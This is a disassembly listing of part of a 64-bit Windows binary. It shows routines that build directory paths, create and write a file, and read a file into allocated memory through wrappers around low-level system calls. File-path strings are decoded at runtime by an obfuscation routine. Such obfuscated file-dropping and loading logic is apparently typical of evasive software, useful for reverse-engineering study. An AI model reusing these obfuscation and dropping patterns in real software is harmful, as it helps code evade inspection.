   14000343a:	cc                   	int3
   14000343b:	cc                   	int3
   14000343c:	cc                   	int3
   14000343d:	cc                   	int3
   14000343e:	cc                   	int3
   14000343f:	cc                   	int3
   140003440:	41 57                	push   %r15
   140003442:	41 56                	push   %r14
   140003444:	41 55                	push   %r13
   140003446:	41 54                	push   %r12
   140003448:	56                   	push   %rsi
   140003449:	57                   	push   %rdi
   14000344a:	55                   	push   %rbp
   14000344b:	53                   	push   %rbx
   14000344c:	48 81 ec 28 05 00 00 	sub    $0x528,%rsp
   140003453:	66 44 0f 7f 84 24 10 	movdqa %xmm8,0x510(%rsp)
   14000345a:	05 00 00 
   14000345d:	66 0f 7f bc 24 00 05 	movdqa %xmm7,0x500(%rsp)
   140003464:	00 00 
   140003466:	0f 29 b4 24 f0 04 00 	movaps %xmm6,0x4f0(%rsp)
   14000346d:	00 
   14000346e:	44 89 44 24 74       	mov    %r8d,0x74(%rsp)
   140003473:	48 89 94 24 c8 00 00 	mov    %rdx,0xc8(%rsp)
   14000347a:	00 
   14000347b:	48 89 cb             	mov    %rcx,%rbx
   14000347e:	48 c7 44 24 78 00 00 	movq   $0x0,0x78(%rsp)
   140003485:	00 00 
   140003487:	0f 57 f6             	xorps  %xmm6,%xmm6
   14000348a:	0f 29 b4 24 b0 00 00 	movaps %xmm6,0xb0(%rsp)
   140003491:	00 
   140003492:	48 8d 8c 24 d0 00 00 	lea    0xd0(%rsp),%rcx
   140003499:	00 
   14000349a:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   1400034a0:	31 d2                	xor    %edx,%edx
   1400034a2:	e8 e9 fb 00 00       	call   0x140013090
   1400034a7:	0f b7 03             	movzwl (%rbx),%eax
   1400034aa:	66 85 c0             	test   %ax,%ax
   1400034ad:	0f 84 fe 01 00 00    	je     0x1400036b1
   1400034b3:	4c 8d b4 24 e0 02 00 	lea    0x2e0(%rsp),%r14
   1400034ba:	00 
   1400034bb:	4c 8d a4 24 d0 00 00 	lea    0xd0(%rsp),%r12
   1400034c2:	00 
   1400034c3:	48 8d 7c 24 60       	lea    0x60(%rsp),%rdi
   1400034c8:	4c 8d 6c 24 78       	lea    0x78(%rsp),%r13
   1400034cd:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   1400034d4:	00 
   1400034d5:	48 8d b4 24 b0 00 00 	lea    0xb0(%rsp),%rsi
   1400034dc:	00 
   1400034dd:	66 0f 6f 3d fb 10 01 	movdqa 0x110fb(%rip),%xmm7        # 0x1400145e0
   1400034e4:	00 
   1400034e5:	66 44 0f 6f 05 02 11 	movdqa 0x11102(%rip),%xmm8        # 0x1400145f0
   1400034ec:	01 00 
   1400034ee:	45 31 ff             	xor    %r15d,%r15d
   1400034f1:	eb 20                	jmp    0x140003513
   1400034f3:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400034fa:	84 00 00 00 00 00 
   140003500:	42 0f b7 44 3b 02    	movzwl 0x2(%rbx,%r15,1),%eax
   140003506:	49 83 c7 02          	add    $0x2,%r15
   14000350a:	66 85 c0             	test   %ax,%ax
   14000350d:	0f 84 9e 01 00 00    	je     0x1400036b1
   140003513:	66 42 89 84 3c d0 00 	mov    %ax,0xd0(%rsp,%r15,1)
   14000351a:	00 00 
   14000351c:	66 83 f8 2f          	cmp    $0x2f,%ax
   140003520:	74 08                	je     0x14000352a
   140003522:	0f b7 c0             	movzwl %ax,%eax
   140003525:	83 f8 5c             	cmp    $0x5c,%eax
   140003528:	75 d6                	jne    0x140003500
   14000352a:	41 b8 10 02 00 00    	mov    $0x210,%r8d
   140003530:	4c 89 f1             	mov    %r14,%rcx
   140003533:	31 d2                	xor    %edx,%edx
   140003535:	e8 56 fb 00 00       	call   0x140013090
   14000353a:	80 3d ed a7 50 00 00 	cmpb   $0x0,0x50a7ed(%rip)        # 0x14050dd2e
   140003541:	0f 84 24 01 00 00    	je     0x14000366b
   140003547:	80 3d 84 a9 50 00 00 	cmpb   $0x0,0x50a984(%rip)        # 0x14050ded2
   14000354e:	74 33                	je     0x140003583
   140003550:	f3 0f 7e 05 70 a9 50 	movq   0x50a970(%rip),%xmm0        # 0x14050dec8
   140003557:	00 
   140003558:	66 0f fd c7          	paddw  %xmm7,%xmm0
   14000355c:	66 41 0f db c0       	pand   %xmm8,%xmm0
   140003561:	66 0f d6 05 5f a9 50 	movq   %xmm0,0x50a95f(%rip)        # 0x14050dec8
   140003568:	00 
   140003569:	8b 05 61 a9 50 00    	mov    0x50a961(%rip),%eax        # 0x14050ded0
   14000356f:	83 c0 13             	add    $0x13,%eax
   140003572:	0f b6 c0             	movzbl %al,%eax
   140003575:	66 89 05 54 a9 50 00 	mov    %ax,0x50a954(%rip)        # 0x14050ded0
   14000357c:	c6 05 4f a9 50 00 00 	movb   $0x0,0x50a94f(%rip)        # 0x14050ded2
   140003583:	4c 89 f1             	mov    %r14,%rcx
   140003586:	48 8d 15 3b a9 50 00 	lea    0x50a93b(%rip),%rdx        # 0x14050dec8
   14000358d:	e8 fe f9 00 00       	call   0x140012f90
   140003592:	4c 89 f1             	mov    %r14,%rcx
   140003595:	4c 89 e2             	mov    %r12,%rdx
   140003598:	e8 e3 f9 00 00       	call   0x140012f80
   14000359d:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   1400035a4:	00 00 
   1400035a6:	4c 89 f1             	mov    %r14,%rcx
   1400035a9:	e8 f2 f9 00 00       	call   0x140012fa0
   1400035ae:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   1400035b5:	01 c0                	add    %eax,%eax
   1400035b7:	66 89 4c 24 62       	mov    %cx,0x62(%rsp)
   1400035bc:	66 89 44 24 60       	mov    %ax,0x60(%rsp)
   1400035c1:	4c 89 74 24 68       	mov    %r14,0x68(%rsp)
   1400035c6:	0f 29 b4 24 80 00 00 	movaps %xmm6,0x80(%rsp)
   1400035cd:	00 
   1400035ce:	0f 29 b4 24 90 00 00 	movaps %xmm6,0x90(%rsp)
   1400035d5:	00 
   1400035d6:	c7 84 24 80 00 00 00 	movl   $0x30,0x80(%rsp)
   1400035dd:	30 00 00 00 
   1400035e1:	c7 84 24 98 00 00 00 	movl   $0x40,0x98(%rsp)
   1400035e8:	40 00 00 00 
   1400035ec:	48 89 bc 24 90 00 00 	mov    %rdi,0x90(%rsp)
   1400035f3:	00 
   1400035f4:	48 8d 84 24 a0 00 00 	lea    0xa0(%rsp),%rax
   1400035fb:	00 
   1400035fc:	0f 11 30             	movups %xmm6,(%rax)
   1400035ff:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
   140003606:	00 
   140003607:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   14000360e:	00 00 
   140003610:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   140003617:	00 
   140003618:	c7 44 24 38 03 00 00 	movl   $0x3,0x38(%rsp)
   14000361f:	00 
   140003620:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140003627:	00 
   140003628:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   14000362f:	00 
   140003630:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003637:	00 00 
   140003639:	4c 89 e9             	mov    %r13,%rcx
   14000363c:	ba 16 01 12 00       	mov    $0x120116,%edx
   140003641:	49 89 e8             	mov    %rbp,%r8
   140003644:	49 89 f1             	mov    %rsi,%r9
   140003647:	e8 d6 dd ff ff       	call   0x140001422
   14000364c:	85 c0                	test   %eax,%eax
   14000364e:	78 0a                	js     0x14000365a
   140003650:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   140003655:	e8 04 de ff ff       	call   0x14000145e
   14000365a:	42 0f b7 44 3b 02    	movzwl 0x2(%rbx,%r15,1),%eax
   140003660:	66 85 c0             	test   %ax,%ax
   140003663:	0f 85 9d fe ff ff    	jne    0x140003506
   140003669:	eb 46                	jmp    0x1400036b1
   14000366b:	c6 05 60 a8 50 00 01 	movb   $0x1,0x50a860(%rip)        # 0x14050ded2
   140003672:	48 b8 49 00 2c 00 2c 	movabs $0x49002c002c0049,%rax
   140003679:	00 49 00 
   14000367c:	48 89 05 45 a8 50 00 	mov    %rax,0x50a845(%rip)        # 0x14050dec8
   140003683:	66 c7 05 44 a8 50 00 	movw   $0xed,0x50a844(%rip)        # 0x14050ded0
   14000368a:	ed 00 
   14000368c:	48 8d 0d 5d 02 00 00 	lea    0x25d(%rip),%rcx        # 0x1400038f0
   140003693:	e8 d8 dc ff ff       	call   0x140001370
   140003698:	c6 05 8f a6 50 00 01 	movb   $0x1,0x50a68f(%rip)        # 0x14050dd2e
   14000369f:	80 3d 2c a8 50 00 00 	cmpb   $0x0,0x50a82c(%rip)        # 0x14050ded2
   1400036a6:	0f 85 a4 fe ff ff    	jne    0x140003550
   1400036ac:	e9 d2 fe ff ff       	jmp    0x140003583
   1400036b1:	48 8d b4 24 e0 02 00 	lea    0x2e0(%rsp),%rsi
   1400036b8:	00 
   1400036b9:	41 b8 10 02 00 00    	mov    $0x210,%r8d
   1400036bf:	48 89 f1             	mov    %rsi,%rcx
   1400036c2:	31 d2                	xor    %edx,%edx
   1400036c4:	e8 c7 f9 00 00       	call   0x140013090
   1400036c9:	80 3d 58 a6 50 00 00 	cmpb   $0x0,0x50a658(%rip)        # 0x14050dd28
   1400036d0:	0f 84 ae 01 00 00    	je     0x140003884
   1400036d6:	80 3d e5 a6 50 00 00 	cmpb   $0x0,0x50a6e5(%rip)        # 0x14050ddc2
   1400036dd:	74 3c                	je     0x14000371b
   1400036df:	f3 0f 7e 05 d1 a6 50 	movq   0x50a6d1(%rip),%xmm0        # 0x14050ddb8
   1400036e6:	00 
   1400036e7:	66 0f fd 05 11 0f 01 	paddw  0x10f11(%rip),%xmm0        # 0x140014600
   1400036ee:	00 
   1400036ef:	66 0f db 05 f9 0e 01 	pand   0x10ef9(%rip),%xmm0        # 0x1400145f0
   1400036f6:	00 
   1400036f7:	66 0f d6 05 b9 a6 50 	movq   %xmm0,0x50a6b9(%rip)        # 0x14050ddb8
   1400036fe:	00 
   1400036ff:	b8 cf 00 00 00       	mov    $0xcf,%eax
   140003704:	03 05 b6 a6 50 00    	add    0x50a6b6(%rip),%eax        # 0x14050ddc0
   14000370a:	0f b6 c0             	movzbl %al,%eax
   14000370d:	66 89 05 ac a6 50 00 	mov    %ax,0x50a6ac(%rip)        # 0x14050ddc0
   140003714:	c6 05 a7 a6 50 00 00 	movb   $0x0,0x50a6a7(%rip)        # 0x14050ddc2
   14000371b:	48 8d 15 96 a6 50 00 	lea    0x50a696(%rip),%rdx        # 0x14050ddb8
   140003722:	48 89 f1             	mov    %rsi,%rcx
   140003725:	e8 66 f8 00 00       	call   0x140012f90
   14000372a:	48 89 f1             	mov    %rsi,%rcx
   14000372d:	48 89 da             	mov    %rbx,%rdx
   140003730:	e8 4b f8 00 00       	call   0x140012f80
   140003735:	48 c7 84 24 80 00 00 	movq   $0x0,0x80(%rsp)
   14000373c:	00 00 00 00 00 
   140003741:	48 89 f1             	mov    %rsi,%rcx
   140003744:	e8 57 f8 00 00       	call   0x140012fa0
   140003749:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140003750:	01 c0                	add    %eax,%eax
   140003752:	66 89 8c 24 82 00 00 	mov    %cx,0x82(%rsp)
   140003759:	00 
   14000375a:	66 89 84 24 80 00 00 	mov    %ax,0x80(%rsp)
   140003761:	00 
   140003762:	48 89 b4 24 88 00 00 	mov    %rsi,0x88(%rsp)
   140003769:	00 
   14000376a:	0f 57 f6             	xorps  %xmm6,%xmm6
   14000376d:	0f 29 b4 24 d0 00 00 	movaps %xmm6,0xd0(%rsp)
   140003774:	00 
   140003775:	0f 29 b4 24 e0 00 00 	movaps %xmm6,0xe0(%rsp)
   14000377c:	00 
   14000377d:	c7 84 24 d0 00 00 00 	movl   $0x30,0xd0(%rsp)
   140003784:	30 00 00 00 
   140003788:	c7 84 24 e8 00 00 00 	movl   $0x40,0xe8(%rsp)
   14000378f:	40 00 00 00 
   140003793:	48 8d 84 24 80 00 00 	lea    0x80(%rsp),%rax
   14000379a:	00 
   14000379b:	48 89 84 24 e0 00 00 	mov    %rax,0xe0(%rsp)
   1400037a2:	00 
   1400037a3:	0f 29 b4 24 f0 00 00 	movaps %xmm6,0xf0(%rsp)
   1400037aa:	00 
   1400037ab:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   1400037b2:	00 00 
   1400037b4:	0f 29 b4 24 b0 00 00 	movaps %xmm6,0xb0(%rsp)
   1400037bb:	00 
   1400037bc:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
   1400037c3:	00 
   1400037c4:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   1400037cb:	00 00 
   1400037cd:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   1400037d4:	00 
   1400037d5:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
   1400037dc:	00 
   1400037dd:	c7 44 24 30 03 00 00 	movl   $0x3,0x30(%rsp)
   1400037e4:	00 
   1400037e5:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   1400037ec:	00 
   1400037ed:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400037f4:	00 00 
   1400037f6:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400037fb:	4c 8d 84 24 d0 00 00 	lea    0xd0(%rsp),%r8
   140003802:	00 
   140003803:	48 8d b4 24 b0 00 00 	lea    0xb0(%rsp),%rsi
   14000380a:	00 
   14000380b:	ba 00 00 11 c0       	mov    $0xc0110000,%edx
   140003810:	49 89 f1             	mov    %rsi,%r9
   140003813:	e8 0a dc ff ff       	call   0x140001422
   140003818:	85 c0                	test   %eax,%eax
   14000381a:	78 3b                	js     0x140003857
   14000381c:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140003821:	0f 11 74 24 38       	movups %xmm6,0x38(%rsp)
   140003826:	8b 44 24 74          	mov    0x74(%rsp),%eax
   14000382a:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000382e:	48 8b 84 24 c8 00 00 	mov    0xc8(%rsp),%rax
   140003835:	00 
   140003836:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000383b:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003840:	31 d2                	xor    %edx,%edx
   140003842:	45 31 c0             	xor    %r8d,%r8d
   140003845:	45 31 c9             	xor    %r9d,%r9d
   140003848:	e8 e4 db ff ff       	call   0x140001431
   14000384d:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140003852:	e8 07 dc ff ff       	call   0x14000145e
   140003857:	0f 28 b4 24 f0 04 00 	movaps 0x4f0(%rsp),%xmm6
   14000385e:	00 
   14000385f:	0f 28 bc 24 00 05 00 	movaps 0x500(%rsp),%xmm7
   140003866:	00 
   140003867:	44 0f 28 84 24 10 05 	movaps 0x510(%rsp),%xmm8
   14000386e:	00 00 
   140003870:	48 81 c4 28 05 00 00 	add    $0x528,%rsp
   140003877:	5b                   	pop    %rbx
   140003878:	5d                   	pop    %rbp
   140003879:	5f                   	pop    %rdi
   14000387a:	5e                   	pop    %rsi
   14000387b:	41 5c                	pop    %r12
   14000387d:	41 5d                	pop    %r13
   14000387f:	41 5e                	pop    %r14
   140003881:	41 5f                	pop    %r15
   140003883:	c3                   	ret
   140003884:	c6 05 37 a5 50 00 01 	movb   $0x1,0x50a537(%rip)        # 0x14050ddc2
   14000388b:	48 b8 8d 00 70 00 70 	movabs $0x8d00700070008d,%rax
   140003892:	00 8d 00 
   140003895:	48 89 05 1c a5 50 00 	mov    %rax,0x50a51c(%rip)        # 0x14050ddb8
   14000389c:	66 c7 05 1b a5 50 00 	movw   $0x31,0x50a51b(%rip)        # 0x14050ddc0
   1400038a3:	31 00 
   1400038a5:	48 8d 0d 24 00 00 00 	lea    0x24(%rip),%rcx        # 0x1400038d0
   1400038ac:	e8 bf da ff ff       	call   0x140001370
   1400038b1:	c6 05 70 a4 50 00 01 	movb   $0x1,0x50a470(%rip)        # 0x14050dd28
   1400038b8:	80 3d 03 a5 50 00 00 	cmpb   $0x0,0x50a503(%rip)        # 0x14050ddc2
   1400038bf:	0f 85 1a fe ff ff    	jne    0x1400036df
   1400038c5:	e9 51 fe ff ff       	jmp    0x14000371b
   1400038ca:	cc                   	int3
   1400038cb:	cc                   	int3
   1400038cc:	cc                   	int3
   1400038cd:	cc                   	int3
   1400038ce:	cc                   	int3
   1400038cf:	cc                   	int3
   1400038d0:	66 c7 05 e7 a4 50 00 	movw   $0x0,0x50a4e7(%rip)        # 0x14050ddc0
   1400038d7:	00 00 
   1400038d9:	48 c7 05 d4 a4 50 00 	movq   $0x0,0x50a4d4(%rip)        # 0x14050ddb8
   1400038e0:	00 00 00 00 
   1400038e4:	c3                   	ret
   1400038e5:	cc                   	int3
   1400038e6:	cc                   	int3
   1400038e7:	cc                   	int3
   1400038e8:	cc                   	int3
   1400038e9:	cc                   	int3
   1400038ea:	cc                   	int3
   1400038eb:	cc                   	int3
   1400038ec:	cc                   	int3
   1400038ed:	cc                   	int3
   1400038ee:	cc                   	int3
   1400038ef:	cc                   	int3
   1400038f0:	66 c7 05 d7 a5 50 00 	movw   $0x0,0x50a5d7(%rip)        # 0x14050ded0
   1400038f7:	00 00 
   1400038f9:	48 c7 05 c4 a5 50 00 	movq   $0x0,0x50a5c4(%rip)        # 0x14050dec8
   140003900:	00 00 00 00 
   140003904:	c3                   	ret
   140003905:	cc                   	int3
   140003906:	cc                   	int3
   140003907:	cc                   	int3
   140003908:	cc                   	int3
   140003909:	cc                   	int3
   14000390a:	cc                   	int3
   14000390b:	cc                   	int3
   14000390c:	cc                   	int3
   14000390d:	cc                   	int3
   14000390e:	cc                   	int3
   14000390f:	cc                   	int3
   140003910:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003913:	0f 11 05 72 a5 50 00 	movups %xmm0,0x50a572(%rip)        # 0x14050de8c
   14000391a:	0f 29 05 5f a5 50 00 	movaps %xmm0,0x50a55f(%rip)        # 0x14050de80
   140003921:	0f 29 05 48 a5 50 00 	movaps %xmm0,0x50a548(%rip)        # 0x14050de70
   140003928:	0f 29 05 31 a5 50 00 	movaps %xmm0,0x50a531(%rip)        # 0x14050de60
   14000392f:	0f 29 05 1a a5 50 00 	movaps %xmm0,0x50a51a(%rip)        # 0x14050de50
   140003936:	0f 29 05 03 a5 50 00 	movaps %xmm0,0x50a503(%rip)        # 0x14050de40
   14000393d:	0f 29 05 ec a4 50 00 	movaps %xmm0,0x50a4ec(%rip)        # 0x14050de30
   140003944:	0f 29 05 d5 a4 50 00 	movaps %xmm0,0x50a4d5(%rip)        # 0x14050de20
   14000394b:	0f 29 05 be a4 50 00 	movaps %xmm0,0x50a4be(%rip)        # 0x14050de10
   140003952:	0f 29 05 a7 a4 50 00 	movaps %xmm0,0x50a4a7(%rip)        # 0x14050de00
   140003959:	c3                   	ret
   14000395a:	cc                   	int3
   14000395b:	cc                   	int3
   14000395c:	cc                   	int3
   14000395d:	cc                   	int3
   14000395e:	cc                   	int3
   14000395f:	cc                   	int3
   140003960:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003963:	0f 29 05 36 a5 50 00 	movaps %xmm0,0x50a536(%rip)        # 0x14050dea0
   14000396a:	c7 05 3c a5 50 00 00 	movl   $0x0,0x50a53c(%rip)        # 0x14050deb0
   140003971:	00 00 00 
   140003974:	c3                   	ret
   140003975:	cc                   	int3
   140003976:	cc                   	int3
   140003977:	cc                   	int3
   140003978:	cc                   	int3
   140003979:	cc                   	int3
   14000397a:	cc                   	int3
   14000397b:	cc                   	int3
   14000397c:	cc                   	int3
   14000397d:	cc                   	int3
   14000397e:	cc                   	int3
   14000397f:	cc                   	int3
   140003980:	c7 05 36 a5 50 00 00 	movl   $0x0,0x50a536(%rip)        # 0x14050dec0
   140003987:	00 00 00 
   14000398a:	48 c7 05 23 a5 50 00 	movq   $0x0,0x50a523(%rip)        # 0x14050deb8
   140003991:	00 00 00 00 
   140003995:	c3                   	ret
   140003996:	cc                   	int3
   140003997:	cc                   	int3
   140003998:	cc                   	int3
   140003999:	cc                   	int3
   14000399a:	cc                   	int3
   14000399b:	cc                   	int3
   14000399c:	cc                   	int3
   14000399d:	cc                   	int3
   14000399e:	cc                   	int3
   14000399f:	cc                   	int3
   1400039a0:	56                   	push   %rsi
   1400039a1:	57                   	push   %rdi
   1400039a2:	53                   	push   %rbx
   1400039a3:	48 81 ec f0 02 00 00 	sub    $0x2f0,%rsp
   1400039aa:	0f 29 b4 24 e0 02 00 	movaps %xmm6,0x2e0(%rsp)
   1400039b1:	00 
   1400039b2:	48 89 d6             	mov    %rdx,%rsi
   1400039b5:	48 89 cb             	mov    %rcx,%rbx
   1400039b8:	48 8d bc 24 d0 00 00 	lea    0xd0(%rsp),%rdi
   1400039bf:	00 
   1400039c0:	41 b8 10 02 00 00    	mov    $0x210,%r8d
   1400039c6:	48 89 f9             	mov    %rdi,%rcx
   1400039c9:	31 d2                	xor    %edx,%edx
   1400039cb:	e8 c0 f6 00 00       	call   0x140013090
   1400039d0:	80 3d da a3 50 00 00 	cmpb   $0x0,0x50a3da(%rip)        # 0x14050ddb1
   1400039d7:	0f 84 08 02 00 00    	je     0x140003be5
   1400039dd:	80 3d 76 ce 50 00 00 	cmpb   $0x0,0x50ce76(%rip)        # 0x14051085a
   1400039e4:	74 3c                	je     0x140003a22
   1400039e6:	f3 0f 7e 05 62 ce 50 	movq   0x50ce62(%rip),%xmm0        # 0x140510850
   1400039ed:	00 
   1400039ee:	66 0f fd 05 1a 0c 01 	paddw  0x10c1a(%rip),%xmm0        # 0x140014610
   1400039f5:	00 
   1400039f6:	66 0f db 05 22 0c 01 	pand   0x10c22(%rip),%xmm0        # 0x140014620
   1400039fd:	00 
   1400039fe:	66 0f d6 05 4a ce 50 	movq   %xmm0,0x50ce4a(%rip)        # 0x140510850
   140003a05:	00 
   140003a06:	b8 c5 00 00 00       	mov    $0xc5,%eax
   140003a0b:	03 05 47 ce 50 00    	add    0x50ce47(%rip),%eax        # 0x140510858
   140003a11:	0f b6 c0             	movzbl %al,%eax
   140003a14:	66 89 05 3d ce 50 00 	mov    %ax,0x50ce3d(%rip)        # 0x140510858
   140003a1b:	c6 05 38 ce 50 00 00 	movb   $0x0,0x50ce38(%rip)        # 0x14051085a
   140003a22:	48 8d 15 27 ce 50 00 	lea    0x50ce27(%rip),%rdx        # 0x140510850
   140003a29:	48 89 f9             	mov    %rdi,%rcx
   140003a2c:	e8 5f f5 00 00       	call   0x140012f90
   140003a31:	48 89 f9             	mov    %rdi,%rcx
   140003a34:	48 89 da             	mov    %rbx,%rdx
   140003a37:	e8 44 f5 00 00       	call   0x140012f80
   140003a3c:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   140003a43:	00 00 
   140003a45:	48 89 f9             	mov    %rdi,%rcx
   140003a48:	e8 53 f5 00 00       	call   0x140012fa0
   140003a4d:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140003a54:	01 c0                	add    %eax,%eax
   140003a56:	66 89 4c 24 5a       	mov    %cx,0x5a(%rsp)
   140003a5b:	66 89 44 24 58       	mov    %ax,0x58(%rsp)
   140003a60:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   140003a65:	0f 57 f6             	xorps  %xmm6,%xmm6
   140003a68:	0f 29 b4 24 a0 00 00 	movaps %xmm6,0xa0(%rsp)
   140003a6f:	00 
   140003a70:	0f 29 b4 24 b0 00 00 	movaps %xmm6,0xb0(%rsp)
   140003a77:	00 
   140003a78:	c7 84 24 a0 00 00 00 	movl   $0x30,0xa0(%rsp)
   140003a7f:	30 00 00 00 
   140003a83:	c7 84 24 b8 00 00 00 	movl   $0x40,0xb8(%rsp)
   140003a8a:	40 00 00 00 
   140003a8e:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140003a93:	48 89 84 24 b0 00 00 	mov    %rax,0xb0(%rsp)
   140003a9a:	00 
   140003a9b:	0f 29 b4 24 c0 00 00 	movaps %xmm6,0xc0(%rsp)
   140003aa2:	00 
   140003aa3:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   140003aaa:	00 00 
   140003aac:	0f 29 74 24 70       	movaps %xmm6,0x70(%rsp)
   140003ab1:	c7 44 24 28 20 00 00 	movl   $0x20,0x28(%rsp)
   140003ab8:	00 
   140003ab9:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140003ac0:	00 
   140003ac1:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140003ac6:	4c 8d 84 24 a0 00 00 	lea    0xa0(%rsp),%r8
   140003acd:	00 
   140003ace:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140003ad3:	ba 00 00 10 80       	mov    $0x80100000,%edx
   140003ad8:	e8 90 d9 ff ff       	call   0x14000146d
   140003add:	85 c0                	test   %eax,%eax
   140003adf:	0f 88 eb 00 00 00    	js     0x140003bd0
   140003ae5:	0f 29 b4 24 80 00 00 	movaps %xmm6,0x80(%rsp)
   140003aec:	00 
   140003aed:	48 c7 84 24 90 00 00 	movq   $0x0,0x90(%rsp)
   140003af4:	00 00 00 00 00 
   140003af9:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003afe:	c7 44 24 20 05 00 00 	movl   $0x5,0x20(%rsp)
   140003b05:	00 
   140003b06:	48 8d 7c 24 70       	lea    0x70(%rsp),%rdi
   140003b0b:	4c 8d 84 24 80 00 00 	lea    0x80(%rsp),%r8
   140003b12:	00 
   140003b13:	48 89 fa             	mov    %rdi,%rdx
   140003b16:	41 b9 18 00 00 00    	mov    $0x18,%r9d
   140003b1c:	e8 0f da ff ff       	call   0x140001530
   140003b21:	85 c0                	test   %eax,%eax
   140003b23:	0f 88 9d 00 00 00    	js     0x140003bc6
   140003b29:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   140003b30:	00 
   140003b31:	89 06                	mov    %eax,(%rsi)
   140003b33:	48 c7 44 24 50 00 00 	movq   $0x0,0x50(%rsp)
   140003b3a:	00 00 
   140003b3c:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140003b41:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140003b48:	00 
   140003b49:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   140003b50:	00 
   140003b51:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140003b56:	4c 8d 4c 24 68       	lea    0x68(%rsp),%r9
   140003b5b:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140003b62:	45 31 c0             	xor    %r8d,%r8d
   140003b65:	e8 3f d9 ff ff       	call   0x1400014a9
   140003b6a:	85 c0                	test   %eax,%eax
   140003b6c:	78 46                	js     0x140003bb4
   140003b6e:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003b73:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140003b78:	8b 16                	mov    (%rsi),%edx
   140003b7a:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140003b7e:	f3 0f 7f 44 24 38    	movdqu %xmm0,0x38(%rsp)
   140003b84:	89 54 24 30          	mov    %edx,0x30(%rsp)
   140003b88:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003b8d:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003b92:	31 d2                	xor    %edx,%edx
   140003b94:	45 31 c0             	xor    %r8d,%r8d
   140003b97:	45 31 c9             	xor    %r9d,%r9d
   140003b9a:	e8 a1 d8 ff ff       	call   0x140001440
   140003b9f:	85 c0                	test   %eax,%eax
   140003ba1:	78 11                	js     0x140003bb4
   140003ba3:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003ba8:	e8 b1 d8 ff ff       	call   0x14000145e
   140003bad:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140003bb2:	eb 1e                	jmp    0x140003bd2
   140003bb4:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003bb9:	e8 a0 d8 ff ff       	call   0x14000145e
   140003bbe:	c7 06 00 00 00 00    	movl   $0x0,(%rsi)
   140003bc4:	eb 0a                	jmp    0x140003bd0
   140003bc6:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003bcb:	e8 8e d8 ff ff       	call   0x14000145e
   140003bd0:	31 c0                	xor    %eax,%eax
   140003bd2:	0f 28 b4 24 e0 02 00 	movaps 0x2e0(%rsp),%xmm6
   140003bd9:	00 
   140003bda:	48 81 c4 f0 02 00 00 	add    $0x2f0,%rsp
   140003be1:	5b                   	pop    %rbx
   140003be2:	5f                   	pop    %rdi
   140003be3:	5e                   	pop    %rsi
   140003be4:	c3                   	ret
   140003be5:	c6 05 6e cc 50 00 01 	movb   $0x1,0x50cc6e(%rip)        # 0x14051085a
   140003bec:	48 b8 97 00 7a 00 7a 	movabs $0x97007a007a0097,%rax
   140003bf3:	00 97 00 
   140003bf6:	48 89 05 53 cc 50 00 	mov    %rax,0x50cc53(%rip)        # 0x140510850
   140003bfd:	66 c7 05 52 cc 50 00 	movw   $0x3b,0x50cc52(%rip)        # 0x140510858
   140003c04:	3b 00 
   140003c06:	48 8d 0d 23 00 00 00 	lea    0x23(%rip),%rcx        # 0x140003c30
   140003c0d:	e8 5e d7 ff ff       	call   0x140001370
   140003c12:	c6 05 98 a1 50 00 01 	movb   $0x1,0x50a198(%rip)        # 0x14050ddb1
